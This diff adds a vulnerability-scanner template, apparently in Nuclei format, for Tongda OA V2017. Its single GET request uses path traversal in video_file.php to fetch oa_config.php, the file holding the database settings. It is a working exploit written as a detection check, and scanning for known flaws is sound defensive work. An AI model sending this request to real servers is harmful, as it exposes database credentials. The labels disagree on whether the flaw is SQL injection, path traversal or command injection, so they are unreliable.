@@ -1,0 +1,39 @@
+id: 通达OA V2017任意文件下载
+time: "2022-08-05"
+
+info:
+  name: Office Anywhere TongDa - Path Traversal
+  author: pikpikcu
+  severity: critical
+  description: 通达OA sql注入漏洞
+  reference:
+    - https://github.com/jas502n/OA-tongda-RCE
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: tongda,lfi
+  metadata:
+    max-request: 1
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
+    
+        
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'MYSQL_DB'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/05/30
